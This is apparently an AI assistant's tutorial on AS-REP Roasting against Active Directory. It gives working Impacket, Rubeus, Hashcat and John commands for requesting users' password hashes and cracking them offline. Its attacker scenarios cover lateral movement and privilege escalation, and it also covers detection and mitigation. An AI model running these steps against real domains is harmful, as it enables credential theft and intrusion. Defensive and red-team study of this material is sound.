## AS-REP Roasting (Active Directory Attack Technique)

**AS-REP Roasting** is an attack against Microsoft Active Directory that allows an attacker to retrieve encrypted authentication data for certain domain users and attempt to crack their passwords offline.

It targets accounts that have **“Do not require Kerberos preauthentication”** enabled.

This technique abuses the Kerberos protocol used in Windows domains.

---

## 🔐 How Kerberos Normally Works

In a normal Kerberos authentication flow:

1. User sends an **AS-REQ** (Authentication Service Request) to the Domain Controller.
2. The DC requires **pre-authentication** (proof the user knows their password).
3. If correct → DC returns **AS-REP** containing a Ticket Granting Ticket (TGT).

If **pre-authentication is disabled**:

* The DC sends back an **AS-REP without verifying the password**.
* That AS-REP is encrypted with the user's password hash.
* Attackers can capture it and brute-force it offline.

That is AS-REP Roasting.

---

## 🎯 When Is AS-REP Roasting Possible?

The attack works when:

* The domain is running Active Directory
* A user account has:

  * `Do not require Kerberos preauthentication` enabled
* Attacker has:

  * Domain username list
  * Network access to Domain Controller (usually internal)

Common targets:

* Service accounts
* Legacy accounts
* Misconfigured admin accounts

---

# 🛠 Tools for AS-REP Roasting

Below are the most famous and effective tools used in red team engagements.

---

## 1️⃣ Impacket

Impacket is one of the most powerful Python-based toolkits for attacking AD environments.

### Tool: `GetNPUsers.py`

This script requests AS-REP responses for users without pre-auth.

### 🔎 Enumerate & Roast

```bash
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -request
```

With credentials:

```bash
GetNPUsers.py domain.local/user:password -dc-ip 10.10.10.10 -request
```

Output example:

```
$krb5asrep$23$user@domain.local:HASHDATA...
```

Save the hash → crack with Hashcat.

---

## 2️⃣ Rubeus (Windows)

Rubeus is a powerful Windows-based Kerberos attack tool.

### AS-REP Roast All Vulnerable Users

```powershell
Rubeus.exe asreproast
```

Specific user:

```powershell
Rubeus.exe asreproast /user:username
```

Save output:

```powershell
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
```

---

## 3️⃣ Hashcat (Password Cracking)

Hashcat is used to crack AS-REP hashes offline.

AS-REP hash mode:

```
18200
```

Crack command:

```bash
hashcat -m 18200 hash.txt wordlist.txt
```

With rules:

```bash
hashcat -m 18200 hash.txt rockyou.txt -r best64.rule
```

---

## 4️⃣ John the Ripper

John the Ripper also supports AS-REP hashes.

```bash
john --format=krb5asrep hash.txt --wordlist=rockyou.txt
```

---

## 5️⃣ CrackMapExec

CrackMapExec can enumerate users and assist in domain recon.

User enumeration:

```bash
crackmapexec smb 10.10.10.10 -u user -p password --users
```

---

# 🔥 Realistic Attack Scenarios

---

## 🧨 Scenario 1 – Internal Attacker (Initial Foothold)

Attacker compromises one workstation.

Steps:

1. Enumerate domain users.
2. Run:

   ```bash
   GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip DC_IP -request
   ```
3. Collect AS-REP hashes.
4. Crack offline.
5. Reuse cracked credentials for:

   * Lateral movement
   * Privilege escalation

---

## 🧨 Scenario 2 – External with VPN Access

If attacker has:

* Valid low-priv domain account
* VPN access

They can:

* Run Rubeus
* Roast all vulnerable users
* Crack offline
* Target privileged accounts

---

## 🧨 Scenario 3 – Red Team AD Assessment

Red team checks:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
```

If results appear → AS-REP roasting possible.

---

# 📌 Attack Flow Summary

1. Get username list
2. Request AS-REP
3. Extract hash
4. Offline crack
5. Credential reuse

---

# ⚠ Why AS-REP Roasting Is Dangerous

* No need for domain credentials (in many cases)
* No account lockout risk
* Fully offline cracking
* Hard to detect
* Often forgotten misconfiguration

---

# 🛡 Detection & Mitigation

## 🔎 Detection

Monitor:

* Event ID 4768 (TGT request)
* Requests without pre-auth
* Unusual Kerberos traffic spikes

Use:

* Microsoft Defender for Identity
* Splunk
* Microsoft Sentinel

---

## 🔐 Mitigation

✅ Disable “Do not require Kerberos preauthentication”
✅ Strong password policies
✅ Long complex service account passwords
✅ Use gMSA accounts
✅ Regular AD audits

Check for vulnerable accounts:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

---

# 🧠 Difference vs Kerberoasting

| AS-REP Roasting                 | Kerberoasting                 |
| ------------------------------- | ----------------------------- |
| No creds required               | Requires valid domain account |
| Targets pre-auth disabled users | Targets SPN service accounts  |
| Requests AS-REP                 | Requests TGS                  |

---

# 🧩 Hash Format Example

```
$krb5asrep$23$john@domain.local:3e156ada591263...
```

---

If you want, I can also provide:

* 🔍 A full AD lab setup for practicing AS-REP roasting
* 🧪 Detection engineering examples
* 📊 Blue team hunting queries
* 🔐 Comparison with other AD attacks

Let me know your focus (red team or blue team).
